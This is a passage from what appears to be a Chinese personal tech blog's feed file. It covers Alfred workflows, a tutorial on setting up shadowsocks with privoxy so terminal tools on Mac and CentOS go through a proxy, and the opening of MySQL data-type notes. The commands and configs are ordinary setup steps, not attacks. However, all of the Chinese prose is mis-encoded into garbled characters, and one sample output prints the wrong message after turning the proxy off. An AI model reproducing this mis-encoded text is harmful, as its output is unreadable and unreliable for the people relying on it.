id="é«˜çº§åº”ç”¨"><a href="#é«˜çº§åº”ç”¨" class="headerlink" title="é«˜çº§åº”ç”¨"></a>é«˜çº§åº”ç”¨</h1><p>Alfred çœŸæ­£çš„é»‘ç§‘æŠ€æ˜¯ workflowï¼Œè¯ä¸æ‰€è¯´ï¼Œç›´æ¥ä¸Šå›¾ï¼š</p><h2 id="1-ç¿»è¯‘"><a href="#1-ç¿»è¯‘" class="headerlink" title="1. ç¿»è¯‘"></a>1. ç¿»è¯‘</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgK3emhEHH3u3q9noNpE37d5p0V2V96kM9qV2wwh8w67AUZ4jwiaRuWZg/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Translate"></p><h2 id="2-æ—¶é—´æˆ³è½¬æ¢"><a href="#2-æ—¶é—´æˆ³è½¬æ¢" class="headerlink" title="2. æ—¶é—´æˆ³è½¬æ¢"></a>2. æ—¶é—´æˆ³è½¬æ¢</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgviaJNlpTn0llmruJNlsrxFTZ1yN4dycEMuESWw9C1HYal9VgmJaThRw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Timestamp Convert"></p><h2 id="3-è‰²å€¼è½¬æ¢"><a href="#3-è‰²å€¼è½¬æ¢" class="headerlink" title="3. è‰²å€¼è½¬æ¢"></a>3. è‰²å€¼è½¬æ¢</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgJfKxt2ibac01dq6uotxuicKodIpNX4TLjunPMFIqSdbdSjvNVgABib5iag/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Color Show"></p><h2 id="4-Hash"><a href="#4-Hash" class="headerlink" title="4. Hash"></a>4. Hash</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Hgxh7sCToTEibibbuzR86Oj6m3GwQFDIvgc5iaIIwHd0sXicjEAicicG68PeaAL6qesf42sxZicBpHOS8GI3dfxIibib5Dg/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1" alt="Hash"></p><p>æˆ‘ä½¿ç”¨çš„ workflow å·²ä¸Šä¼ è‡³ç™¾åº¦äº‘ç›˜ï¼Œé“¾æ¥:<a href="https://pan.baidu.com/s/1eVyVe7DR9_NH_9vqafys9w" target="_blank" rel="noopener">https://pan.baidu.com/s/1eVyVe7DR9_NH_9vqafys9w</a>  å¯†ç :c1z9</p><hr><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://kuaibao.qq.com/s/20180211A01CU900?refer=cp_1026%200%20%E5%88%86%E4%BA%AB%20%20%E6%89%AB%E6%8F%8F%E4%BA%8C%E7%BB%B4%E7%A0%81" target="_blank" rel="noopener">Macæ•ˆç‡ç¥å™¨Alfredç³»åˆ—æ•™ç¨‹-Snippetsæ–‡å­—æ‰©å±•</a></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤è¡Œä¸‹ä½¿ç”¨ä»£ç†</title>
      <link href="/post/proxy-on-terminal/"/>
      <url>/post/proxy-on-terminal/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r3f8nnmj30xw0703zu.jpg" alt="proxy"></p><a id="more"></a><p>å¯¹äºç»å¸¸éœ€è¦ä¾èµ–å›½å¤–èµ„æºçš„å¼€å‘è€…ï¼Œç»ˆç«¯çš„ä¸‹è½½é€Ÿåº¦è®©äººæŠ“ç‹‚ï¼Œè¯¸å¦‚å¸¸è§çš„ wgetã€curlã€gitã€brew ç­‰å‘½ä»¤è¡Œå·¥å…·è¶…æ…¢ï¼Œç”šè‡³æ— æ³•è·å–èµ„æºï¼Œè¿™å°±éœ€è¦æ­å»ºä¸€ä¸ªç§‘å­¦ä¸Šç½‘åˆ©å™¨ï¼Œä¾‹å¦‚ç›®å‰æµè¡Œçš„shadowsocksï¼Œæˆ‘ä»¬é…ç½®å¥½ shadowsocks æœåŠ¡å™¨ç«¯åï¼Œå®‰è£…å¯¹åº”ç³»ç»Ÿçš„å®¢æˆ·ç«¯ä¾¿å¯ï¼Œç„¶è€Œå½“ä½ æ„å»ºçš„æ—¶å€™è¿˜æ˜¯ä¼šå¾ˆæ…¢ï¼Œè¿™æ—¶ä½ å‘ç°ç³»ç»Ÿè‡ªå¸¦çš„ç»ˆç«¯æˆ– iTerm 2 æ˜¯ä¸èµ° Socks5 ã€‚</p><p>å› åœ¨ç»ˆç«¯ä¸‹ä¸æ”¯æŒSocks5ä»£ç†ï¼Œåªæ”¯æŒhttpä»£ç†ï¼Œè¿™å°±éœ€è¦æ›²å¾„é€šå¹½äº†ã€‚</p><h1 id="Macå¹³å°ä¸‹å®‰è£…"><a href="#Macå¹³å°ä¸‹å®‰è£…" class="headerlink" title="Macå¹³å°ä¸‹å®‰è£…"></a>Macå¹³å°ä¸‹å®‰è£…</h1><blockquote><p>ç¯å¢ƒï¼š<br>OS X 10.12.5<br>ShadowsocksX-NG 1.5.0</p></blockquote><p>OS X 10.11ä¹‹åè¾ƒæ–°çš„ç³»ç»Ÿé»˜è®¤è®¾ç½®ä¸‹ä¸ä¼šå®‰è£…æˆåŠŸã€‚è‹¹æœåœ¨æ–°ç³»ç»Ÿä¸­åŠ å…¥äº†SIPå®‰å…¨æœºåˆ¶ï¼Œä»–ä¼šé˜»æ­¢ç¬¬ä¸‰æ–¹ç¨‹åºå‘ç³»ç»Ÿç›®å½•å†…ï¼ˆ/Systemï¼Œ/binï¼Œ/sbinï¼Œ/usr(é™¤äº†/usr/local)ï¼‰è¿›è¡Œå†™æ“ä½œï¼Œsudoä¹Ÿä¸è¡Œã€‚åŠæ³•æ˜¯å…ˆæŠŠSIPå…³äº†ï¼Œç­‰è£…å¥½è½¯ä»¶é…ç½®å¥½åå†æ‰“å¼€SIPã€‚æˆ–è€…æ”¹ç”¨å…¶ä»–è½¯ä»¶ã€‚</p><p>å…³é—­SIPä¹Ÿéº»çƒ¦ï¼Œé‚ç”¨privoxyè¿™ä¸ªç»å…¸è½¯ä»¶ï¼Œå®ƒåˆšå¥½å°±æ˜¯å®‰è£…åœ¨/usr/localå†…ï¼Œä¸éœ€è¦å…³é—­SIPä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p><h3 id="1-privoxyå®‰è£…"><a href="#1-privoxyå®‰è£…" class="headerlink" title="1. privoxyå®‰è£…"></a>1. privoxyå®‰è£…</h3><p><code>brew install privoxy</code></p><h3 id="2-privoxyé…ç½®"><a href="#2-privoxyé…ç½®" class="headerlink" title="2. privoxyé…ç½®"></a>2. privoxyé…ç½®</h3><p><code>vim /usr/local/etc/privoxy/config</code><br>åœ¨æ–‡ä»¶æœ«å°¾è¾“å…¥ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listen-address <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8118</span></span><br><span class="line">forward-socks5 / localhost:<span class="number">1086</span> .</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œè®¾ç½®privoxyç›‘å¬ä»»æ„IPåœ°å€çš„8118ç«¯å£(privoxyçš„é»˜è®¤ç«¯å£)ã€‚ç¬¬äºŒè¡Œè®¾ç½®æœ¬åœ°socks5ä»£ç†å®¢æˆ·ç«¯ç«¯å£ï¼Œæ³¨æ„ä¸è¦å¿˜äº†æœ€åæœ‰ä¸€ä¸ªç©ºæ ¼å’Œç‚¹å·ã€‚<br><em>æ—§ç‰ˆ ShadowsocksX åˆ›å»ºçš„ ã€ŒSOCKS5 ä»£ç†ã€ç«¯å£ é»˜è®¤æ˜¯ 1080ï¼Œæ–°ç‰ˆ ShadowsocksX-NG åˆ›å»ºçš„ ã€ŒSOCKS5 ä»£ç†ã€ç«¯å£ é»˜è®¤æ”¹æˆ 1086 å‡çº§ååˆ«å¿˜äº†ä¿®æ”¹ä»£ç†æ’ä»¶å¯¹åº”çš„ç«¯å£ã€‚</em></p><h3 id="3-å¯åŠ¨privoxy"><a href="#3-å¯åŠ¨privoxy" class="headerlink" title="3. å¯åŠ¨privoxy"></a>3. å¯åŠ¨privoxy</h3><p>å› ä¸ºæ²¡æœ‰å®‰è£…åœ¨ç³»ç»Ÿç›®å½•å†…ï¼Œæ‰€ä»¥å¯åŠ¨çš„æ—¶å€™éœ€è¦æ‰“å…¨è·¯å¾„ã€‚<br><code>sudo /usr/local/sbin/privoxy /usr/local/etc/privoxy/config</code></p><h3 id="4-æµ‹è¯•shadowsocks"><a href="#4-æµ‹è¯•shadowsocks" class="headerlink" title="4. æµ‹è¯•shadowsocks"></a>4. æµ‹è¯•shadowsocks</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1086</span></span><br><span class="line">telnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8118</span></span><br></pre></td></tr></table></figure><h3 id="5-privoxyä½¿ç”¨"><a href="#5-privoxyä½¿ç”¨" class="headerlink" title="5. privoxyä½¿ç”¨"></a>5. privoxyä½¿ç”¨</h3><p>åœ¨<code>~/.bashrc</code>æˆ–<code>~/zshrc</code>ä¸­åŠ å…¥ä»¥ä¸‹å¼€å…³å‡½æ•°ï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy_off</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unset</span> http_proxy</span><br><span class="line">    <span class="keyword">unset</span> https_proxy</span><br><span class="line">    <span class="keyword">echo</span> -e <span class="string">"å·²å…³é—­ä»£ç†"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy_on</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    export no_proxy=<span class="string">"localhost,127.0.0.1,localaddress,.localdomain.com"</span></span><br><span class="line">    export http_proxy=<span class="string">"http://127.0.0.1:8118"</span></span><br><span class="line">    export https_proxy=$http_proxy</span><br><span class="line">    <span class="keyword">echo</span> -e <span class="string">"å·²å¼€å¯ä»£ç†"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>source ~/.bashrc</code>æˆ–<code>source ~/.zshrc</code>ä½¿é…ç½®ç«‹å³ç”Ÿæ•ˆã€‚</p><h3 id="7-å¼€å¯ä»£ç†æµ‹è¯•"><a href="#7-å¼€å¯ä»£ç†æµ‹è¯•" class="headerlink" title="7. å¼€å¯ä»£ç†æµ‹è¯•"></a>7. å¼€å¯ä»£ç†æµ‹è¯•</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~Â Â <span class="selector-tag">proxy_on</span></span><br><span class="line">å·²å¼€å¯ä»£ç†</span><br><span class="line">~Â Â <span class="selector-tag">curl</span> <span class="selector-tag">ip</span><span class="selector-class">.cn</span></span><br><span class="line">å½“å‰ <span class="selector-tag">IP</span>ï¼š8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span> æ¥è‡ªï¼šç¾å›½</span><br></pre></td></tr></table></figure><h1 id="Linuxä¸‹çš„å®‰è£…"><a href="#Linuxä¸‹çš„å®‰è£…" class="headerlink" title="Linuxä¸‹çš„å®‰è£…"></a>Linuxä¸‹çš„å®‰è£…</h1><blockquote><p>ç¯å¢ƒï¼š<br>CentOS 7.3.1611</p></blockquote><h3 id="1-å®‰è£…shadowsocksã€pipã€privoxy"><a href="#1-å®‰è£…shadowsocksã€pipã€privoxy" class="headerlink" title="1. å®‰è£…shadowsocksã€pipã€privoxy"></a>1. å®‰è£…shadowsocksã€pipã€privoxy</h3><p>è¯·å…ˆç¡®ä¿ä½ å·²ç»æ·»åŠ äº†EPELæºï¼Œ<code>yum repolist</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# yum repolist</span><br><span class="line">å·²åŠ è½½æ’ä»¶ï¼šfastestmirror</span><br><span class="line">Loading<span class="built_in"> mirror </span>speeds <span class="keyword">from</span> cached hostfile</span><br><span class="line"> * base: mirrors.nju.edu.cn</span><br><span class="line"> * elrepo: mirrors.ircam.fr</span><br><span class="line"> * epel: mirrors.tuna.tsinghua.edu.cn</span><br><span class="line"> * extras: mirrors.njupt.edu.cn</span><br><span class="line"> * updates: mirrors.njupt.edu.cn</span><br><span class="line">æºæ ‡è¯†           æºåç§°                                                çŠ¶æ€</span><br><span class="line">base/7/x86_64    CentOS-7 - Base                                        9,363</span><br><span class="line">elrepo           ELRepo.org<span class="built_in"> Community </span>Enterprise Linux Repository - el    194</span><br><span class="line">epel/x86_64      Extra Packages <span class="keyword">for</span> Enterprise Linux 7 - x86_64        11,873</span><br><span class="line">extras/7/x86_64  CentOS-7 - Extras                                        446</span><br><span class="line">updates/7/x86_64 CentOS-7 - Updates                                     2,089</span><br><span class="line">repolist: 23,965</span><br></pre></td></tr></table></figure><p>å¦‚æœå°šæœªæ·»åŠ ï¼Œåˆ™ä½¿ç”¨<code>sudo yum -y install epel-release</code>æ·»åŠ EPELã€‚</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…shadowsocksã€pipã€privoxyï¼š<br><code>$ sudo yum -y install python-pip privoxy</code><br><code>$ sudo pip install shadowsocks</code></p><h3 id="2-é…ç½®"><a href="#2-é…ç½®" class="headerlink" title="2. é…ç½®"></a>2. é…ç½®</h3><h4 id="2-1-é…ç½®ss"><a href="#2-1-é…ç½®ss" class="headerlink" title="2.1 é…ç½®ss"></a>2.1 é…ç½®ss</h4><p><code>$ sudo mkdir -p /etc/shadowsocks</code><br><code>$ sudo vi /etc/shadowsocks/config.json</code><br>config.jsoné…ç½®å†…å®¹ä¸ºï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">"server"</span>:<span class="string">"bot02.rom.mk"</span>,ï¼ˆä½ çš„ä»£ç†æœåŠ¡å™¨<span class="built_in">IP</span>æˆ–åŸŸååœ°å€ï¼‰</span><br><span class="line"> <span class="string">"server_port"</span>:<span class="number">443</span>,ï¼ˆä»£ç†æœåŠ¡å™¨ä¸Šç›‘å¬çš„ç«¯å£å·ï¼‰</span><br><span class="line"> <span class="string">"local_port"</span>:<span class="number">1080</span>,ï¼ˆæœ¬åœ°çš„ç›‘å¬ç«¯å£å·ï¼‰</span><br><span class="line"> <span class="string">"password"</span>:<span class="string">"xxxx"</span>,ï¼ˆä»£ç†æœåŠ¡å™¨çš„å¯†ç ï¼‰</span><br><span class="line"> <span class="string">"timeout"</span>:<span class="number">600</span>,</span><br><span class="line"> <span class="string">"method"</span>:<span class="string">"aes-256-cfbï¼ˆåŠ å¯†æ–¹å¼ï¼‰"</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><em>è‹¥æœªé…ç½®local_portï¼Œåˆ™é»˜è®¤ä¸º1080</em></p><h4 id="2-2-å¯åŠ¨ss"><a href="#2-2-å¯åŠ¨ss" class="headerlink" title="2.2 å¯åŠ¨ss"></a>2.2 å¯åŠ¨ss</h4><p>åå°è¿è¡Œshadowsocksï¼š<br>å¯åŠ¨ï¼š<code>sslocal -c /etc/shadowsocks/config.json -d start</code><br>åœæ­¢ï¼š<code>sslocal -c /etc/shadowsocks/config.json -d stop</code></p><p>ä½†è¿™æ ·æ¯æ¬¡é‡å¯ç³»ç»Ÿçš„æ—¶å€™éƒ½éœ€è¦æ‰§è¡Œå¯åŠ¨å‘½ä»¤æ¥å¯åŠ¨ssï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•è®¾ç½®å¼€æœºè‡ªåŠ¨å¯åŠ¨ï¼š<br><code>vi /usr/lib/systemd/system/sslocal.service</code><br>å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Shadowsocks Server</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">PermissionsStartOnly=true</span><br><span class="line">ExecStartPre=/bin/mkdir -p /run/shadowsocks</span><br><span class="line">ExecStartPre=/bin/chown nobody:nobody /run/shadowsocks</span><br><span class="line">ExecStart=/usr/bin/sslocal -c /etc/shadowsocks/config.json</span><br><span class="line">Restart=on-abort</span><br><span class="line">User=root</span><br><span class="line">Group=root</span><br><span class="line">UMask=0027</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤<code>systemctl start sslocal</code>å¯åŠ¨ssï¼Œ<br>æ‰§è¡Œå‘½ä»¤<code>systemctl status sslocal</code>æŸ¥çœ‹ssçŠ¶æ€ï¼Œå¦‚æœæ˜¯<code>active</code>ï¼Œæ‰§è¡Œ<code>systemctl enable sslocal</code>è®¾ç½®å¼€æœºè‡ªå¯ã€‚<br>æ‰§è¡Œ<code>reboot</code>é‡å¯ç³»ç»Ÿï¼Œç„¶åä½¿ç”¨<code>systemctl status sslocal</code>æŸ¥çœ‹å¯åŠ¨æƒ…å†µï¼Œå¦‚æœ‰å¼‚å¸¸è¯·æ ¹æ®æ—¥å¿—æç¤ºè§£å†³ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½å¾ˆæ–¹ä¾¿çš„é€šè¿‡ç³»ç»Ÿå‘½ä»¤<code>systemctl</code>æ¥ç®¡ç†ssè¿›ç¨‹äº†ã€‚</p><h4 id="2-2-privoxyé…ç½®"><a href="#2-2-privoxyé…ç½®" class="headerlink" title="2.2 privoxyé…ç½®"></a>2.2 privoxyé…ç½®</h4><p><code>$ sudo vi /etc/privoxy/config</code><br>åœ¨æ–‡ä»¶æœ«å°¾è¾“å…¥ï¼š<br><code>forward-socks5 / 127.0.0.1:1080 .</code></p><p>å¯åŠ¨privoxy<br><code>$ sudo service privoxy restart</code></p><p>åŒæ ·çš„ï¼Œæ‰§è¡Œ<code>systemctl enable privoxy</code>è®¾ç½®å¼€æœºå¯åŠ¨privoxy</p><h3 id="3-æµ‹è¯•"><a href="#3-æµ‹è¯•" class="headerlink" title="3. æµ‹è¯•"></a>3. æµ‹è¯•</h3><p>å‚ç…§Macä¸‹çš„é…ç½®è®¾ç½®å¼€å…³å‡½æ•°ã€‚<br>ä½¿ç”¨Telnetæµ‹è¯•shadowsockså’Œprivoxyæ˜¯å¦æ­£å¸¸<br><code>telnet 127.0.0.1 1080</code><br><code>telnet 127.0.0.1 8118</code><br>å¯ä»¥è¿æ¥æˆåŠŸè¯´æ˜æ­£å¸¸è¿è¡Œã€‚</p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å®é™…æ•ˆæœ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~Â Â <span class="selector-tag">proxy_on</span></span><br><span class="line">å·²å¼€å¯ä»£ç†</span><br><span class="line">~Â Â <span class="selector-tag">curl</span> <span class="selector-tag">ip</span><span class="selector-class">.cn</span></span><br><span class="line">å½“å‰ <span class="selector-tag">IP</span>ï¼š8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span> æ¥è‡ªï¼šç¾å›½</span><br><span class="line">~Â Â <span class="selector-tag">proxy_off</span></span><br><span class="line">å·²å¼€å¯ä»£ç†</span><br><span class="line">~Â Â <span class="selector-tag">curl</span> <span class="selector-tag">ip</span><span class="selector-class">.cn</span></span><br><span class="line">å½“å‰ <span class="selector-tag">IP</span>ï¼š121<span class="selector-class">.69</span><span class="selector-class">.50</span><span class="selector-class">.42</span> æ¥è‡ªï¼šåŒ—äº¬å¸‚ ç”µä¿¡é€š</span><br></pre></td></tr></table></figure><h1 id="åŸç†è§£æ"><a href="#åŸç†è§£æ" class="headerlink" title="åŸç†è§£æ"></a>åŸç†è§£æ</h1><p>æˆ‘ä»¬ç»ˆç«¯ä¸­çš„httpå’Œhttpsè¯·æ±‚é€šè¿‡å¼€å…³å‡½æ•°è½¬å‘åˆ°äº†privoxyçš„8118ç«¯å£ï¼Œç„¶åè¢«privoxyè½¬æ¢ä¸ºsocks5åè®®è½¬å‘åˆ°shadowsocksçš„1080æˆ–1086ç«¯å£ï¼Œæœ€åæœ¬åœ°è¿è¡Œçš„shadowsockså®¢æˆ·ç«¯ä¸è¿œç¨‹shadowsocksæœåŠ¡å™¨é€šä¿¡ï¼Œä»è€Œå®ç°å‘½ä»¤ä¸‹çš„ä»£ç†åŠŸèƒ½ã€‚</p><hr><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a href="https://lvii.gitbooks.io/outman/content/ss.mac.html" target="_blank" rel="noopener">shadowsocks on Mac OS X</a></li><li><a href="http://www.cashqian.net/blog/001486989831982332565298e4942a2bb8f56b08f9d2475000" target="_blank" rel="noopener">Macå‘½ä»¤è¡Œç»ˆç«¯ä¸‹ä½¿ç”¨shadowsocksç¿»å¢™</a></li><li><a href="http://ian.wang/196.htm" target="_blank" rel="noopener">Shadowsocks+Privoxyæ‰“é€ Linux / Mac sockså’Œhttpä»£ç†</a></li><li><a href="https://juejin.im/entry/58d29f6161ff4b006cb218d9" target="_blank" rel="noopener">ä½¿ç”¨ shadowsocks åŠ é€Ÿ Mac è‡ªå¸¦ç»ˆç«¯æˆ– iTerm 2</a></li><li><a href="http://www.iosugar.com/2017/02/19/Mac-terminal-environment/" target="_blank" rel="noopener">Macç»ˆç«¯ç¯å¢ƒèµ°ä»£ç†</a></li><li><a href="http://www.guanxigo.com/cross-gfw-in-linux-terminal" target="_blank" rel="noopener">Linuxç»ˆç«¯ä¸‹ç¿»å¢™æ•™ç¨‹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç»ˆç«¯ </tag>
            
            <tag> Terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLçŸ¥è¯†ç‚¹æ€»ç»“</title>
      <link href="/post/mysql-notes/"/>
      <url>/post/mysql-notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cmfudal9j30p00b4gmd.jpg" alt=""></p><a id="more"></a><h2 id="ä¸€ã€-æ•°æ®ç±»å‹"><a href="#ä¸€ã€-æ•°æ®ç±»å‹" class="headerlink" title="ä¸€ã€ æ•°æ®ç±»å‹"></a>ä¸€ã€ æ•°æ®ç±»å‹</h2><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga7n2rzixaj315m0mgwi6.jpg" alt=""></p><h3 id="1-1-é€‰æ‹©ä¼˜åŒ–çš„æ•°æ®ç±»å‹"><a href="#1-1-é€‰æ‹©ä¼˜åŒ–çš„æ•°æ®ç±»å‹" class="headerlink" title="1.1 é€‰æ‹©ä¼˜åŒ–çš„æ•°æ®ç±»å‹"></a>1.1 é€‰æ‹©ä¼˜åŒ–çš„æ•°æ®ç±»å‹</h3><ol><li>æ›´å°çš„é€šå¸¸æœ€å¥½ï¼šæ›´å°çš„æ•°æ®å ç”¨æ›´å°‘çš„ç³»ç»Ÿèµ„æº</li><li>ä½¿ç”¨å†…å»ºçš„ç±»å‹æ¥å­˜å‚¨åˆé€‚çš„å†…å®¹ï¼Œå¦‚ä½¿ç”¨DATETIMEæˆ–TIMESTAMPå­˜å‚¨æ—¶é—´ï¼Œè€Œä¸æ˜¯VARCHAR</li><li>å°½é‡é¿å…ä½¿ç”¨nullï¼Œå› ä¸ºè¿™ä¼šé™ä½æ€§èƒ½</li><li>TIMESTAMPåªä½¿ç”¨DATETIMEçš„ä¸€åŠç©ºé—´ï¼Œå¹¶ä¸”ä¼šæ ¹æ®æ—¶åŒºæ¥è‡ªåŠ¨æ›´æ–°ï¼Œå½“TIMESTAMPè®¾ç½®é»˜è®¤å€¼ä¸ºCURRENT_TIMESTAMPå’ŒNOW()æ—¶ï¼ŒTIMESTAMPçš„å€¼å¹¶ä¸ä¼šéšç€æ›´æ”¹æŸä¸€å­—æ®µè€Œè‡ªåŠ¨æ›´æ”¹ã€‚</li></ol><h3 id="1-2-æ•°æ®ç±»å‹éœ€è¦æ³¨æ„çš„"><a href="#1-2-æ•°æ®ç±»å‹éœ€è¦æ³¨æ„çš„" class="headerlink" title="1.2 æ•°æ®ç±»å‹éœ€è¦æ³¨æ„çš„"></a>1.2 æ•°æ®ç±»å‹éœ€è¦æ³¨æ„çš„</h3><h4 id="1-2-1-æ•°å€¼å‹"><a href="#1-2-1-æ•°å€¼å‹" class="headerlink" title="1.2.1 æ•°å€¼å‹"></a>1.2.1 æ•°å€¼å‹</h4><ul><li>INT(11)å…¶å®å¹¶æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œå®ƒå¹¶ä¸ä¼šé™åˆ¶æ•°å€¼çš„åˆæ³•èŒƒå›´ã€‚</li><li><strong>DECIMALç±»å‹ä¸»è¦ç”¨äºå­˜å‚¨ç²¾ç¡®çš„å°æ•°ç±»å‹ï¼ˆå¦‚é‡‘é¢ï¼‰</strong>ï¼Œå› ä¸ºéœ€è¦é¢å¤–çš„ç©ºé—´å’Œè®¡ç®—å¼€é”€ï¼Œå› æ­¤åªåœ¨å¯¹å°æ•°è¿›è¡Œç²¾ç¡®è®¡ç®—æ—¶æ‰ä½¿ç”¨DECIMALã€‚</li><li>æµ®ç‚¹ç±»å‹åœ¨å­˜å‚¨åŒæ ·èŒƒå›´çš„å€¼æ—¶ï¼Œé€šå¸¸æ¯”DECIMALä½¿ç”¨æ›´å°‘çš„ç©ºé—´ã€‚</li></ul><h4 id="1-2-2-å­—ç¬¦ä¸²å‹"><a href="#1-2-2-å­—ç¬¦ä¸²å‹" class="headerlink" title="1.2.2 å­—ç¬¦ä¸²å‹"></a>1.2.2 å­—ç¬¦ä¸²å‹</h4><ul><li>VARCHARä½¿ç”¨æ›´å°‘çš„å­˜å‚¨ç©ºé—´ï¼Œä½†ç´¢å¼•é€Ÿåº¦ä½äºCHARï¼ŒVARCHARéœ€è¦é¢å¤–çš„ä¿¡æ¯æ¥ä¿å­˜é•¿åº¦ä¿¡æ¯ã€‚</li><li>ä½¿ç”¨VARCHAR(5)å’ŒVARCHAR(20)æ¥å­˜å‚¨â€™helloâ€™çš„ç©ºé—´å¼€é”€æ˜¯ä¸€æ ·çš„ï¼Œä½†VARCHAR(20)ä¼šæ¶ˆè€—æ›´é•¿çš„åˆ—ï¼Œå› æ­¤æˆ‘ä»¬åªåˆ†é…çœŸæ­£éœ€è¦çš„ç©ºé—´ã€‚</li><li><strong>ä½¿ç”¨æšä¸¾(ENUM)å’ŒSETä»£æ›¿å­—ç¬¦ä¸²ç±»å‹ï¼Œåœ¨MySQLå†…éƒ¨ä½¿ç”¨æ•´æ•°å­˜å‚¨ENUMå’ŒSETç±»å‹ï¼Œç„¶ååœ¨åšæ¯”è¾ƒæ—¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</strong>ã€‚</li></ul><h4 id="1-2-3-æ—¥æœŸæ—¶é—´å‹"><a href="#1-2-3-æ—¥æœŸæ—¶é—´å‹" class="headerlink" title="1.2.3 æ—¥æœŸæ—¶é—´å‹"></a>1.2.3 